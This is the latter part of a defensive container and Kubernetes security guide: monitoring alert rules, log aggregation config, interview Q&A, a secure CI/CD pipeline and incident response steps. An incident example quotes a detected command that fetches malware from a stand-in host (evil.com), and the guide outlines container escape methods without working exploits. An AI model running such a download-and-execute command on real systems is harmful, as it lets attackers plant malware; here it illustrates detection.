            severity: warning
          annotations:
            summary: "Container running as root"
            description: "Container {{ $labels.container }} in pod {{ $labels.pod }} is running as root"

        # Image vulnerability alert
        - alert: HighVulnerabilityImageDetected
          expr: trivy_vulnerability_count{severity="CRITICAL"} > 0
          for: 1m
          labels:
            severity: critical
          annotations:
            summary: "High vulnerability image detected"
            description: "Image {{ $labels.image }} has {{ $value }} critical vulnerabilities"

        # Pod without resource limits
        - alert: PodWithoutResourceLimits
          expr: |
            kube_pod_container_resource_limits{resource="memory"} == 0
            or
            kube_pod_container_resource_limits{resource="cpu"} == 0
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "Pod without resource limits"
            description: "Container {{ $labels.container }} in pod {{ $labels.pod }} has no resource limits"
```

### Security Log Aggregation

```yaml
# Fluentd configuration - Collect container security logs
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluentd-config
  namespace: logging
data:
  fluent.conf: |
    # Collect Falco alerts
    <source>
      @type tail
      path /var/log/falco/falco.log
      pos_file /var/log/fluentd/falco.log.pos
      tag falco.*
      <parse>
        @type json
        time_key time
        time_format %Y-%m-%dT%H:%M:%S.%L%z
      </parse>
    </source>

    # Collect Kubernetes audit logs
    <source>
      @type tail
      path /var/log/kubernetes/audit.log
      pos_file /var/log/fluentd/k8s-audit.log.pos
      tag kubernetes.audit
      <parse>
        @type json
      </parse>
    </source>

    # Add security-related labels
    <filter falco.**>
      @type record_transformer
      <record>
        log_type security_alert
        source falco
      </record>
    </filter>

    # Filter high-priority security events
    <filter kubernetes.audit>
      @type grep
      <regexp>
        key $.verb
        pattern (create|update|delete|patch)
      </regexp>
    </filter>

    # Output to Elasticsearch
    <match **>
      @type elasticsearch
      host elasticsearch.logging.svc
      port 9200
      index_name container-security-%Y.%m.%d
      <buffer>
        @type file
        path /var/log/fluentd/buffer
        flush_interval 5s
      </buffer>
    </match>
```

## Interview Key Points

### Core Concept Questions

**Q1: What is container escape? How do you prevent it?**

```
Key Points:
1. Container Escape Definition:
   - The process of an attacker breaking container isolation to gain host access

2. Common Escape Methods:
   - Kernel exploits (e.g., Dirty COW, CVE-2019-5736)
   - Privileged container abuse
   - Improper volume mounts (Docker socket, /etc, /proc)
   - Capabilities abuse

3. Prevention Measures:
   - Run as non-root user
   - Disable privileged mode
   - Drop unnecessary capabilities
   - Use Seccomp and AppArmor
   - Keep kernel and container runtime updated
   - Read-only filesystem
   - Resource limits (CPU, memory, PID)
   - Use gVisor or Kata Containers for stronger isolation
```

**Q2: Explain Kubernetes Pod Security Standards**

```
Key Points:
1. Three Security Levels:
   - Privileged: No restrictions
   - Baseline: Prevents known privilege escalations
   - Restricted: Most stringent security restrictions

2. Enforcement Modes:
   - enforce: Reject non-compliant Pods
   - audit: Allow but log violations
   - warn: Allow but issue warnings

3. Restricted Level Requirements:
   - Must run as non-root
   - Privileged mode disabled
   - Privilege escalation disabled
   - All capabilities must be dropped
   - Must use seccomp profile
   - Must use read-only root filesystem (recommended)
```

**Q3: How do you securely manage Kubernetes Secrets?**

```
Key Points:
1. Secrets Limitations:
   - Base64 encoding is NOT encryption
   - Not encrypted in etcd by default
   - Can be read by authorized users

2. Security Enhancement Measures:
   - Enable etcd encryption (EncryptionConfiguration)
   - Use external secrets management (Vault, AWS Secrets Manager)
   - Implement RBAC with least privilege
   - Audit secrets access
   - Regular secrets rotation

3. Best Practices:
   - Use External Secrets Operator
   - Vault Agent Sidecar injection
   - Avoid environment variables for sensitive data (use mounted files)
   - Never commit secrets to version control
   - Use sealed-secrets for GitOps workflows
```

### Practical Scenario Questions

**Q4: Design a secure CI/CD image build pipeline**

```yaml
# Answer Example: GitLab CI/CD Secure Build Pipeline
stages:
  - build
  - scan
  - sign
  - deploy

variables:
  IMAGE_TAG: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

build:
  stage: build
  image: docker:24-dind
  script:
    # Use BuildKit for enhanced security
    - export DOCKER_BUILDKIT=1
    - docker build
        --no-cache
        --pull
        --secret id=npm_token,env=NPM_TOKEN
        -t $IMAGE_TAG .
    - docker push $IMAGE_TAG

vulnerability-scan:
  stage: scan
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL $IMAGE_TAG
    - trivy image --format sarif --output trivy-report.sarif $IMAGE_TAG
  artifacts:
    reports:
      sast: trivy-report.sarif

sign-image:
  stage: sign
  image: gcr.io/projectsigstore/cosign:latest
  script:
    - cosign sign --key cosign.key $IMAGE_TAG
    - cosign verify --key cosign.pub $IMAGE_TAG

deploy:
  stage: deploy
  script:
    - kubectl set image deployment/app app=$IMAGE_TAG
  only:
    - main
  environment:
    name: production
```

**Q5: Diagnose and respond to container security incidents**

```bash
# Incident Response Process Example

# Detection - Falco alert triggered
# "Suspicious process execution detected in container myapp-pod: /bin/sh -c wget http://evil.com/malware"

# Containment - Isolate affected Pod
kubectl label pod myapp-pod quarantine=true --overwrite
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-policy
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes:
  - Ingress
  - Egress
  # Complete isolation, no traffic allowed
EOF

# Evidence Collection
kubectl logs myapp-pod > /evidence/pod-logs.txt
kubectl describe pod myapp-pod > /evidence/pod-describe.txt
kubectl get events --field-selector involvedObject.name=myapp-pod > /evidence/events.txt

# Analysis - Check container processes
kubectl exec myapp-pod -- ps aux
kubectl exec myapp-pod -- cat /proc/1/cmdline

# Eradication - Delete infected Pod
kubectl delete pod myapp-pod

# Recovery - Redeploy from secure image
kubectl rollout restart deployment myapp

# Lessons Learned - Update security policies
# - Add network policy to restrict egress traffic
# - Update image scanning rules
# - Enhance runtime monitoring
```

### Security Architecture Design Question

**Q6: Design multi-tenant Kubernetes cluster security architecture**

```
Key Points:

1. Namespace Isolation
   - Separate namespace per tenant
   - Resource quotas
   - Network policy isolation

2. RBAC Design
   - Tenant-specific ServiceAccount
   - Least privilege principle
   - Prohibit cross-namespace access

3. Network Isolation
   - Default deny all traffic
   - Whitelist-based allow rules
   - Service mesh for mTLS

4. Resource Isolation
   - Node affinity/taints
   - Pod security policies
   - Resource quotas

5. Monitoring and Auditing
   - Tenant-level log isolation
   - Audit logging
   - Security alerting
```

### Common Security Vulnerabilities and Fixes

| Vulnerability Type | Risk Level | Remediation |
|-------------------|------------|-------------|
| Privileged container | Critical | Remove --privileged, use fine-grained capabilities |
| Running as root | High | Use USER directive to specify non-root user |
| Sensitive directory mount | Critical | Avoid mounting /etc, /var/run/docker.sock |
| No resource limits | Medium | Set resources.limits |
| Unscanned images | High | Integrate Trivy in CI/CD |
| Plaintext secrets | High | Use Vault or external secrets management |
| Overly permissive network policy | Medium | Implement least privilege network policies |
| Missing security context | High | Configure securityContext |
| Outdated base images | High | Regular image updates, automated scanning |
| Missing image signatures | Medium | Implement image signing with Cosign |

## Further Reading

### Official Documentation

- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NIST Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)

### Tools and Frameworks

- [Trivy](https://github.com/aquasecurity/trivy) - Comprehensive vulnerability scanner
- [Falco](https://falco.org/) - Runtime security monitoring
- [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) - Policy enforcement
- [Kyverno](https://kyverno.io/) - Kubernetes native policy management
- [Cosign](https://github.com/sigstore/cosign) - Container signing and verification
- [kubeaudit](https://github.com/Shopify/kubeaudit) - Kubernetes security auditing
- [kube-bench](https://github.com/aquasecurity/kube-bench) - CIS benchmark checker
- [Snyk Container](https://snyk.io/product/container-vulnerability-management/) - Container vulnerability management

### Learning Resources

- [Kubernetes Security Academy](https://kubernetes.io/docs/tutorials/security/)
- [Aqua Security Blog](https://blog.aquasec.com/)
- [Sysdig Security Blog](https://sysdig.com/blog/)
- [CNCF Security Technical Advisory Group](https://github.com/cncf/tag-security)

### Books and In-Depth Resources

- "Container Security" by Liz Rice (O'Reilly)
- "Kubernetes Security and Observability" by Brendan Creane and Amit Gupta
- "Hacking Kubernetes" by Andrew Martin and Michael Hausenblas

### Advanced Topics

- **Supply Chain Security**: SLSA framework, in-toto attestations, SBOM generation
- **Zero Trust Architecture**: Service mesh security, workload identity
- **Confidential Computing**: Encrypted containers, secure enclaves
- **eBPF-based Security**: Cilium, Tetragon for kernel-level security

## Summary

Container security is a multi-layered, comprehensive protection system that requires defense across multiple dimensions including image building, runtime, orchestration layer, and network layer. Core principles include:

1. **Principle of Least Privilege**: Grant only necessary permissions, drop unneeded capabilities
2. **Defense in Depth**: Multiple security measures ensure single point of failure doesn't lead to complete compromise
3. **Zero Trust Architecture**: Trust no component, always verify identity and permissions
4. **Continuous Monitoring**: Real-time anomaly detection, rapid incident response
5. **Automated Security**: Integrate security checks into CI/CD pipeline
6. **Immutable Infrastructure**: Treat containers as immutable, rebuild rather than patch
7. **Shift Left Security**: Integrate security early in the development lifecycle

By implementing the best practices introduced in this article, you can significantly improve the security posture of containerized applications and effectively defend against various container security threats. Remember that security is not a one-time effort but a continuous process that must evolve alongside your infrastructure and threat landscape.
